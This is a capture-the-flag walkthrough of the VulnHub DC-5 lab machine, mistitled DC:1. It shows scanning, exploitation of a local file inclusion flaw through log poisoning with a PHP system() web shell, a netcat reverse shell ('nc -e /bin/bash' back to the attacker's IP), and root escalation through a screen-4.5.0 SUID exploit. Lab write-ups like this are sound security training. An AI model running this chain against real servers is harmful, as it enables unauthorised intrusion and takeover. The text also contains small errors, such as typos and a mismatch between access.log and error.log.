# DC:1 CTF Walkthrough (Vulnhub) 

###### <p align="center"> *This is official repository maintained by me*</center> </p>
###### <p align="center"> *[yigitdrbk](https://www.instagram.com/yigitdrbk/) *</center> </p>

DC:5 is a CTF created by DCAU. You can find the technical information about this CTF on the VulnHub page. First of all, make sure to download and install the correct OVA file from VulnHub. (https://download.vulnhub.com/dc/DC-5.zip).

This CTF is more challenging than others. Because it is hard to find LFI vulnerability at first. But exploitation is more simple than others.

## 1-Recon
As always, I started with reconnaissance. I used Rustscan, nmap, directory searching, and reviewed the website’s code.
```bash
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
111/tcp   open  rpcbind syn-ack ttl 64
47089/tcp open  unknown syn-ack ttl 64

nmap -PN -sC -sV --script vuln -p 80,111,47089 <machine_ip> -oN finalscan

dirsearch -u <machine_ip>
```

It is not a CMS, so there’s no need to add this machine’s IP to /etc/hosts. I didn’t find anything special from either the port scanning or directory scanning.

When I visited the webpage, I saw directories like home, solutions, about us, and so on.

![DC5](https://miro.medium.com/v2/resize:fit:828/format:webp/1*qfbk60arf9LQfYxUQFu1RA.png "DC5")

It is obvios that contact page is suspicious. So I tried to found some bug with burpsuite here.

I give the parameters website to contact and the url was looking like this :

![DC5](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ub_v_OSz60LMq8y26-ygzA.png "DC5")

I tried changing the variables and attempted directory traversal using "../../../", but I didn’t find anything. Finally, I added an argument file=/etc/passwd, and it gave me the passwd file. This vulnerability is called Local File Inclusion (LFI), and it’s a critical vulnerability.

I checked the access.log and error.log files because they store user requests, and it seems I can modify them. The access.log file logs user requests to the server, while error.log logs errors generated by the server.

```bash
10.0.2.4 - - [23/Oct/2024:10:05:33 -0400] "GET / HTTP/1.1" 200 432 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```

![DC5](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0NcYYUKR5eBhYQAvVVLikA.png "DC5")

As you can see above access.log keeps the header parameters too. So I can inject some malicious code here. I injected below php code for giving me the authority to run commands on website. So that I will take the reverse shell.

## 2- Reverse Shell

I poison the url by :

```bash
10.0.2.14/thankyou.php?firstname=yigit&lastname=drbk&file=<?php system($_GET['cmd']) ?>
```
This command will add a php code in access.log directory. I can access it with url and run the netcat now.

```bash
http://10.0.2.14/thankyou.php?firstname=merhaba&lastname=merhaba&file=/var/log/nginx/error.log&cmd=id 
```

The above example is example of how can I run the command with cmd.

I run the netcat on my local computer and connect it with url.

```bash
rlwrap nc -lvnp 1234

http://10.0.2.14/thankyou.php?file=/var/log/nginx/error.log&cmd=nc -e /bin/bash 10.0.2.4 1234
```

So that I have a shell. I run the next classic commands.

```bash
pyton -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

I tried to find out what I could run with root privileges on this machine because the current user is www-data, and I wanted to escalate to root. Running sudo -l and some basic find commands didn’t yield any results. I also checked the operating system version and other details. After researching online, I found the next command that helped.

```bash
find / -perm -u=s -type f 2>/dev/null
```

This give me something interesting.

![DC5](https://miro.medium.com/v2/resize:fit:640/format:webp/1*A4qZBu72aqrAzjIGwMKYOg.png "DC5")

As you can see above, at first glance, screen-4.5.0 looked suspicious. So, I searched for it using searchsploit. Searchsploit provided a PoC (Proof of Concept) text file and an exploit bash script. The next step is to follow the instructions in the exploit file.

![DC5](https://miro.medium.com/v2/resize:fit:828/format:webp/1*vZqFH0EdBCgnnHeZiv9ekA.png "DC5")

After that you should compile the files like the yellow lines. And then you should give the files to your www-data user session (netcat session).

You can do this as below

```bash
python -m SimpleHttpServer
php -S <machine_ip>:<port>
```

Finally get this files with wget and run. Now you have root and you can read the flag.

Developer / Author: [yigitdrbk](https://www.instagram.com/yigitdrbk/)